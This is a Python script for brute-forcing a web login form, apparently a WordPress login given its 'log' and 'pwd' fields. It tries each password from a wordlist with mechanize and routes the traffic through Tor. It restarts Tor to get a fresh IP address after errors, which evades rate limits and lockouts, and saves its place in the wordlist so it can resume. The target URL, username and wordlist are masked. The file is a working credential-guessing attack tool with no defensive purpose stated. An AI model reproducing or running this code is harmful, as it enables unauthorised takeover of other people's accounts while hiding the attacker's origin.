#!/usr/bin/env python

import socks
import socket
import urllib2
import time, os
import mechanize
import linecache
from mechanize import Browser


def create_connection(address, timeout=None, source_address=None):
    sock = socks.socksocket()
    sock.connect(address)
    return sock

socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
socket.socket = socks.socksocket
socket.create_connection = create_connection

################################################################### the above enables tor proxies

url = ("******************")
user = ("*****************")
passfile = ("*************")


counter = open('counter','w') #set counter to 1 for start of script (counter is place in pwd list)
counter.write(str(1))
counter.close()


def login():

	try:

		counter = open('counter').read() # read counter then set i to value stored in counter
		i=int(counter)
		t = int(len(open(passfile).readlines()))

		while i<=t:

			PASS = linecache.getline(passfile, i)

			br = Browser()
			br.set_handle_robots(False)
			br.addheaders = [("User-agent","Python Script using mechanize")]

			sign_in = br.open(url)  #the login url
			time.sleep(1)

			br.select_form(nr = 0) #accessing form by their index. Since we have only one form in this example, nr =0.
			br["log"] = user #the key "username" is the variable that takes the username/email value
			br["pwd"] = PASS #the key "password" is the variable that takes the password value

			logged_in = br.submit()   #submitting the login credentials

			logincheck = logged_in.read()  #reading the page body that is redirected after successful login
						
			print("\n")

			response = br.response() # view response (can see "Error" when incorrect)
			response_text = str(response.read()) # read text from response html as a string
			
			#print logged_in.code   #print HTTP status code(200, 404...)
			#print logged_in.info() #print server info
			#print response_text    #print response
			br.close()

			t = str(len(open(passfile).readlines()))

			if PASS == "":
				print("     No match found\n")
				os.system("service tor stop")
				break

			print("Attempt ("+str(i)+" of "+t+")  -  USER: "+user+" | PASS: "+PASS)
							
			result = str(logged_in.info())

			if "ERROR" in response_text:
				print("-------- FAIL --------\n")                                        			
				print("####################################################################")
				i=i+1
				
			else:
				print("\n-------- SUCCESS --------\n\n     "+PASS)
				os.system("service tor stop")
				break


	except:
		print("\ngenerating new ip...") 
		os.system("service tor restart")
		time.sleep(1)

		counter = open('counter','w') #write current place in pwd list to counter so can be retrieved when restarting function due to error
		counter.write(str(i))
		counter.close()
		login()

login()












'''

PSEUDO CODE FOR RESTARTING FUNCTION AFTER GETTING A CONNECTION ERROR - BUT KEEPING PLACE IN PASSWORD LIST

def func():
	try:
		total = file getnum of lines
		i=1
		while i <= total:
			pass = linecache-get-line i

			if pass = pass:
				print(success)
				break
			else:
				print(failure)
				i=i+1
	except:
		func()
'''